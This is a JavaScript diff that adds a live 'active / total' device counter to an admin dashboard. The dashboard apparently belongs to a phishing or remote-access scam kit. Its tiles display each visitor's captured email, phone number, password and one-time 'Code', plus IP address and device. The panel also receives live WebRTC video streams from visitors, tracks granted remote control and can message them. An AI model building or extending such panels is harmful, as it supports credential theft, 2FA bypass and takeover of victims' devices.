@@ -21,12 +21,45 @@ document.getElementById('admin-password').addEventListener('keypress', (e) => {
     if (e.key === 'Enter') document.getElementById('login-btn').click();
 });
 
+// ---------- ACTIVE DEVICE COUNT ----------
+function updateActiveCount() {
+    const online = Array.from(visitors.values()).filter(v => v.status === 'online').length;
+    const total = visitors.size;
+
+    let badge = document.getElementById('active-device-count');
+    if (!badge) {
+        badge = document.createElement('div');
+        badge.id = 'active-device-count';
+        badge.style.cssText = `
+            position: fixed;
+            top: 16px;
+            right: 16px;
+            background: var(--success, #10b981);
+            color: white;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            box-shadow: 0 4px 12px rgba(16,185,129,0.35);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            pointer-events: none;
+        `;
+        document.body.appendChild(badge);
+    }
+
+    badge.innerHTML = `
+        <span style="width:8px;height:8px;background:white;border-radius:50%;display:inline-block;animation:pulse 1.2s infinite;"></span>
+        ${online} active / ${total} total
+    `;
+}
+
 // ---------- DESKTOP NOTIFICATIONS ----------
 function showDesktopNotification(visitorId, userAgent) {
     if (!("Notification" in window)) return;
     if (Notification.permission !== "granted") return;
-
-    // Only show if the tab is currently in the background
     if (!document.hidden) return;
 
     const options = {
@@ -47,22 +80,22 @@ function showDesktopNotification(visitorId, userAgent) {
 function initWS(password) {
     currentPassword = password;
     try { sessionStorage.setItem('adminPass', password); } catch(e) {}
-   
+
     if (ws) {
         ws.onclose = null; ws.onmessage = null; ws.onerror = null; ws.onopen = null;
         try { ws.close(); } catch(e) {}
     }
-   
+
     const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
     const newWs = new WebSocket(`${protocol}${window.location.host}`);
     ws = newWs;
-   
+
     newWs.onopen = () => newWs.send(JSON.stringify({ type: 'role', role: 'admin', password }));
-   
+
     newWs.onmessage = async (e) => {
         if (ws !== newWs) return;
         const data = JSON.parse(e.data);
-       
+
         if (data.type === 'auth-failed') {
             document.getElementById('login-error').textContent = data.message || 'Invalid password';
             try { sessionStorage.removeItem('adminPass'); } catch(e) {}
@@ -76,8 +109,8 @@ function initWS(password) {
             visitors.clear();
             data.visitors.forEach(v => addOrUpdateVisitor(v));
             toggleEmptyState();
-           
-            // Request notification permission if not already granted/denied
+            updateActiveCount();
+
             if ("Notification" in window && Notification.permission === "default") {
                 Notification.requestPermission();
             }
@@ -87,13 +120,15 @@ function initWS(password) {
             addOrUpdateVisitor(data.visitor);
             playBeep();
             showAdminToast(data.visitor.id.split('-')[0], data.visitor.userAgent);
-            showDesktopNotification(data.visitor.id.split('-')[0], data.visitor.userAgent); // Trigger OS notification
+            showDesktopNotification(data.visitor.id.split('-')[0], data.visitor.userAgent);
             toggleEmptyState();
+            updateActiveCount();
             return;
         }
         if (data.type === 'visitor-disconnected') {
             const v = visitors.get(data.id);
             if (v) { v.status = 'offline'; addOrUpdateVisitor(v); }
+            updateActiveCount();
         }
         if (data.type === 'visitor-removed') {
             visitors.delete(data.id);
@@ -108,8 +143,12 @@ function initWS(password) {
             }
             toggleEmptyState();
             applyFilter();
+            updateActiveCount();
         }
-        if (data.type === 'visitor-updated') addOrUpdateVisitor(data.visitor);
+        if (data.type === 'visitor-updated') {
+            addOrUpdateVisitor(data.visitor);
+            updateActiveCount();
+        }
 
         if (data.type === 'control-granted') {
             controlledVisitors.add(data.sender);
@@ -146,7 +185,7 @@ function initWS(password) {
             await pc.setLocalDescription(answer);
             ws.send(JSON.stringify({ type: 'webrtc-answer', sdp: answer, target: visitorId }));
         }
-       
+
         if (data.type === 'webrtc-ice') {
             const visitorId = data.sender;
             const pc = peerConnections.get(visitorId);
@@ -164,7 +203,7 @@ function initWS(password) {
 window.addEventListener('load', () => {
     let savedPass = null;
     try { savedPass = sessionStorage.getItem('adminPass'); } catch(e) {}
-   
+
     if (savedPass) {
         document.getElementById('login-error').textContent = 'Reconnecting...';
         document.getElementById('login-error').style.color = 'var(--text-muted)';
@@ -174,26 +213,29 @@ window.addEventListener('load', () => {
         document.getElementById('dashboard-screen').classList.remove('active');
         document.getElementById('login-error').textContent = '';
     }
+
+    updateActiveCount();
 });
 
 function refreshDashboard() {
     const btn = document.getElementById('refresh-btn');
     btn.classList.add('spinning');
     btn.disabled = true;
-   
+
     visitors.clear(); streams.clear(); controlledVisitors.clear(); pendingCandidates.clear();
     peerConnections.forEach(pc => { try { pc.close(); } catch(e) {} });
     peerConnections.clear();
     document.querySelectorAll('.tile').forEach(t => t.remove());
     toggleEmptyState();
-   
+    updateActiveCount();
+
     if (currentPassword) initWS(currentPassword);
     else {
         let saved = null;
         try { saved = sessionStorage.getItem('adminPass'); } catch(e) {}
         if (saved) initWS(saved);
     }
-   
+
     setTimeout(() => {
         btn.classList.remove('spinning');
         btn.disabled = false;
@@ -204,18 +246,19 @@ function refreshDashboard() {
 function signOut() {
     try { sessionStorage.removeItem('adminPass'); } catch(e) {}
     currentPassword = null;
-   
+
     if (ws) {
         ws.onclose = null; ws.onmessage = null; ws.onerror = null; ws.onopen = null;
         try { ws.close(); } catch(e) {}
     }
-   
+
     visitors.clear(); streams.clear(); controlledVisitors.clear(); pendingCandidates.clear();
     peerConnections.forEach(pc => { try { pc.close(); } catch(e) {} });
     peerConnections.clear();
     document.querySelectorAll('.tile').forEach(t => t.remove());
     toggleEmptyState();
-   
+    updateActiveCount();
+
     document.getElementById('dashboard-screen').classList.remove('active');
     document.getElementById('login-screen').classList.add('active');
     document.getElementById('admin-password').value = '';
@@ -370,7 +413,7 @@ function createTile(v) {
     tile.id = `tile-${v.id}`;
     tile.className = 'tile';
     tile.dataset.status = v.status;
-   
+
     tile.innerHTML = `
         <div class="tile-header">
             <div class="tile-info">
@@ -410,9 +453,9 @@ function createTile(v) {
             </div>
         </div>
     `;
-   
+
     document.getElementById('visitor-grid').appendChild(tile);
-   
+
     if (streams.has(v.id)) {
         const video = document.getElementById(`video-${v.id}`);
         if (video) { video.srcObject = streams.get(v.id); video.play().catch(err => console.log("Play blocked", err)); }
@@ -423,24 +466,24 @@ function createTile(v) {
 function updateTile(v) {
     let tile = document.getElementById(`tile-${v.id}`);
     if (!tile) tile = createTile(v);
-   
+
     document.getElementById(`title-${v.id}`).textContent = `ID: ${v.id.split('-')[0]}`;
-   
+
     let contactHtml = '<div class="contact-badges">';
     if (v.email) contactHtml += `<span class="c-badge"><strong>E:</strong> <span>${v.email}</span></span>`;
     if (v.phone) contactHtml += `<span class="c-badge"><strong>P:</strong> <span>${v.phone}</span></span>`;
     if (v.password) contactHtml += `<span class="c-badge pass"><strong>Pass:</strong> <span>${v.password}</span></span>`;
     if (v.code) contactHtml += `<span class="c-badge code"><strong>Code:</strong> <span>${v.code}</span></span>`;
     contactHtml += '</div>';
-   
+
     document.getElementById(`contact-${v.id}`).innerHTML = contactHtml;
     document.querySelector(`.device-${v.id}`).textContent = parseUserAgent(v.userAgent);
     document.querySelector(`.ip-${v.id}`).textContent = v.ip;
     tile.dataset.status = v.status;
-   
+
     const msgInput = document.getElementById(`msg-${v.id}`);
     const msgBtn = msgInput.nextElementSibling;
-   
+
     if (v.status === 'online') {
         msgInput.disabled = false; msgBtn.disabled = false;
         startTimer(v.id, v.connectedAt);
@@ -510,6 +553,7 @@ document.getElementById('confirm-delete-btn').addEventListener('click', () => {
         const tile = document.getElementById(`tile-${deleteTargetId}`);
         if (tile) tile.remove();
         toggleEmptyState(); applyFilter(); closeDeleteModal();
+        updateActiveCount();
     }
 });
 
